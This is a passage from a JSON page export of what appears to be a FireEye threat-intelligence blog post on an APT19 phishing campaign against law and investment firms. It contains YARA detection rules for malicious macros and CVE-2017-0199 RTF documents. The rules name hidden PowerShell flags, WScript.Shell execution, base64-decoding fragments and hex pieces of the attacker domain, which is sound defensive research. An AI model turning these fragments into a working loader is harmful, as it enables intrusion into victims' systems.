\u0026quot;ChrW(115) \u0026amp; ChrW(99) \u0026amp; ChrW(114) \u0026amp; ChrW(111) \u0026amp; ChrW(98) \u0026amp; ChrW(106) \u0026amp; ChrW(46) \u0026amp; ChrW(100) \u0026amp; ChrW(108) \u0026amp; ChrW(108)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$obreg1 = \/(\\w{5}\\s\u0026amp;\\s){7}\\w{5}\/\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$obreg2 = \/(Chrw\\(\\d{1,3}\\)\\s\u0026amp;\\s){7}\/\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\/\/ wscript\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$wsobj1 = \u0026quot;Set Obj = CreateObject(\\\u0026quot;WScript.Shell\\\u0026quot;)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$wsobj2 = \u0026quot;Obj.Run \u0026quot; ascii wide\u003C\/p\u003E\n\u003Cp\u003Econdition:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (uint16(0) != 0x5A4D)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; and\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of ($wsobj*) and 3 of ($ob*)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; or\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of ($wsobj*) and all of ($obreg*)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;)\u003Cbr\u003E\n}\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022600\u0022 valign=\u0022top\u0022\u003Erule FE_LEGALSTRIKE_MACRO_2 {\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;meta:version=\u0026quot;.1\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;filetype=\u0026quot;MACRO\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;author=\u0026quot;Ian.Ahl@fireeye.com @TekDefense\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;date=\u0026quot;2017-06-02\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;description=\u0026quot;This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4.\u0026quot;\u003Cbr\u003E\nstrings:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\/\/ Setting the environment\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$env1 = \u0026quot;Arch = Environ(\\\u0026quot;PROCESSOR_ARCHITECTURE\\\u0026quot;)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$env2 = \u0026quot;windir = Environ(\\\u0026quot;windir\\\u0026quot;)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$env3 = \u0026quot;windir + \\\u0026quot;\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe\\\u0026quot;\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\/\/ powershell command fragments\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps1 = \u0026quot;-NoP\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps2 = \u0026quot;-NonI\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps3 = \u0026quot;-W Hidden\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps4 = \u0026quot;-Command\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps5 = \u0026quot;New-Object IO.StreamReader\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps6 = \u0026quot;IO.Compression.DeflateStream\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps7 = \u0026quot;IO.MemoryStream\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps8 = \u0026quot;,$([Convert]::FromBase64String\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ps9 = \u0026quot;ReadToEnd();\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$psregex1 = \/\\W\\w+\\s+\\s\\\u0026quot;.+\\\u0026quot;\/\u003Cbr\u003E\ncondition:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;(\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (uint16(0) != 0x5A4D)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; and\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; (\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of ($env*) and 6 of ($ps*)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; or\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of ($env*) and 4 of ($ps*) and all of ($psregex*)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;)\u003Cbr\u003E\n}\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022600\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Erule FE_LEGALSTRIKE_RTF {\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; meta:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; version=\u0026quot;.1\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; filetype=\u0026quot;MACRO\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; author=\u0026quot;joshua.kim@FireEye.com\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; date=\u0026quot;2017-06-02\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; description=\u0026quot;Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $header = \u0026quot;{\\\\rt\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $lnkinfo = \u0026quot;4c0069006e006b0049006e0066006f\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $encoded1 = \u0026quot;4f4c45324c696e6b\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $encoded2 = \u0026quot;52006f006f007400200045006e007400720079\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $encoded3 = \u0026quot;4f0062006a0049006e0066006f\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $encoded4 = \u0026quot;4f006c0065\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $http1 = \u0026quot;68{\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $http2 = \u0026quot;74{\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $http3 = \u0026quot;07{\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; \/\/ 2bunny.com\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain1 = \u0026quot;32{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain2 = \u0026quot;62{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain3 = \u0026quot;75{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain4 = \u0026quot;6e{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain5 = \u0026quot;79{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain6 = \u0026quot;2e{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain7 = \u0026quot;63{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain8 = \u0026quot;6f{\\\\\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $domain9 = \u0026quot;6d{\\\\\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $datastore = \u0026quot;\\\\*\\\\datastore\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $header at 0 and all of them\u003Cbr\u003E\n}\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco, Christopher Glyer\u003C\/p\u003E\n",
        "jcr:lastModified": "Tue May 14 2019 17:46:53 GMT-0400",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "alt": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "comments": {
        "jcr:primaryType": "nt:unstructured",
        "sling:resourceType": "social\/commons\/components\/comments"
      },
      "trackback": {
        "jcr:primaryType": "nt:unstructured",
        "sling:resourceType": "social\/blog\/components\/trackback"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EFireEye observed a phishing campaign targeting at least seven global law and investment firms and has associated this campaign with APT19.\u003C\/p\u003E\n",
      "jcr:lastModified": "Tue Jun 06 2017 18:18:43 GMT-0400",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Tue Jun 06 2017 18:28:39 GMT-0400",
      "imageRotate": "0"
    }
  }
}
